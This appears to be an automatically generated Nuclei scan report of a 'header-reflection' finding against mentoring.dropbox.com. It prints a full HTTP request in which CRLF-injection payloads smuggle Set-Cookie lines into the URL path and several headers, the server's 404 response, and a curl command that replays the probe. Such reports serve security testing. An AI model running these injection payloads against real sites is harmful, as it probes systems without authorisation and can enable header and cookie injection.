### Looking for reflected values from request headers (header-reflection) found on https://mentoring.dropbox.com

----
**Details**: **header-reflection** matched at https://mentoring.dropbox.com

**Protocol**: HTTP

**Full URL**: https://mentoring.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.mentoring.dropbox.com

**Timestamp**: Sat Dec 9 14:39:21 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.mentoring.dropbox.com HTTP/1.1
Host: mentoring.dropbox.com
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; AWSALB=tS9ZA8HWkOam0cshhr9USeP7n7kYACnpQJbh3GO+p25UpcAxOysGI0f5UoZYxEyZtCjEUxtciVDJU+w67xC+tuOIqzuIWzilWQZ6fNWuaguIQUKOLpYmTnWCtvxl; AWSALBCORS=tS9ZA8HWkOam0cshhr9USeP7n7kYACnpQJbh3GO+p25UpcAxOysGI0f5UoZYxEyZtCjEUxtciVDJU+w67xC+tuOIqzuIWzilWQZ6fNWuaguIQUKOLpYmTnWCtvxl; uniq_token=be673fe8-d10e-4812-8206-1c779df5d60f
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 404 Not Found
Connection: close
Transfer-Encoding: chunked
Content-Security-Policy: frame-ancestors teams.microsoft.com *.teams.microsoft.com 'self';
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 14:39:20 GMT
Set-Cookie: AWSALB=nWInmMqBhLif4OpyDx9CybRTHYfuFFLILTGkga33K2orhGs6tTbr5DIaZcHHza6CD60yHYXgF7FeD2HzPy6EKo0SFG/P0qLqAxthFguwdlIzQDKm2gnd6z4J5La/; Expires=Sat, 16 Dec 2023 14:39:20 GMT; Path=/
Set-Cookie: AWSALBCORS=nWInmMqBhLif4OpyDx9CybRTHYfuFFLILTGkga33K2orhGs6tTbr5DIaZcHHza6CD60yHYXgF7FeD2HzPy6EKo0SFG/P0qLqAxthFguwdlIzQDKm2gnd6z4J5La/; Expires=Sat, 16 Dec 2023 14:39:20 GMT; Path=/; SameSite=None; Secure
Status: 404 Not Found
Strict-Transport-Security: max-age=63072000
Vary: Accept-Encoding
Via: 1.1 e6714c863ae63bdaa0cc735ee5878378.cloudfront.net (CloudFront)
X-Amz-Cf-Id: ZH1nxKkNF8Zok0-Vt_NyMcB3g3oeWGAGk7r6KSjI5fNS0Ge8kNShLQ==
X-Amz-Cf-Pop: MRS52-P1
X-Cache: Error from cloudfront
X-Request-Id: 1234560d0ASet-CookieCanaryCookie12345XRpathsecurehttponly
X-Runtime: 0.001117

<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>The page you were looking for doesn't exist (404)</title>
    <style type="text/css">   
      body { background-color: #fff; color: #666; text-align: center; font-family: arial, sans-serif; }
      div.dialog {
        width: 80%;
      }
      
      @media (min-width: 768px) {
        div.dialog {
          width: 636px  ;
        }
      }
      div.dialog {
        margin: 14% auto;
      }

      h1 { font-size: 100%; color: #f00; line-height: 1.5em; }
      a {
        display: inline-block;
        text-align: center;
        cursor: pointer;
        padding: 7px 14px;
        font-size: 14px;
        background-color: #00ad81;
        color: white;
        margin: 10px 0;
        border-radius: 2px;
        text-decoration: none;
      }
      
    </style>
  </head>

  <body>
    <!-- This file lives in public/404.html -->
    <div class="dialog">
      <img src="https://mentor-global-assets.chronus.com/images/exclamation-triangle.png" height="30" width="30">
      <h1>The page you were looking for doesn't exist.</h1>
      <p>You may have mistyped the address or the page may have moved.</p>
      <a href = "/"> Home </a>
    </div>
  </body>
</html>

```

**Extra Information**

**Extracted results:**

- X-Request-Id: 1234560d0ASet-CookieCanaryCookie12345XRpathsecurehttponly



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; AWSALB=tS9ZA8HWkOam0cshhr9USeP7n7kYACnpQJbh3GO+p25UpcAxOysGI0f5UoZYxEyZtCjEUxtciVDJU+w67xC+tuOIqzuIWzilWQZ6fNWuaguIQUKOLpYmTnWCtvxl; AWSALBCORS=tS9ZA8HWkOam0cshhr9USeP7n7kYACnpQJbh3GO+p25UpcAxOysGI0f5UoZYxEyZtCjEUxtciVDJU+w67xC+tuOIqzuIWzilWQZ6fNWuaguIQUKOLpYmTnWCtvxl; uniq_token=be673fe8-d10e-4812-8206-1c779df5d60f' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://mentoring.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.mentoring.dropbox.com'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)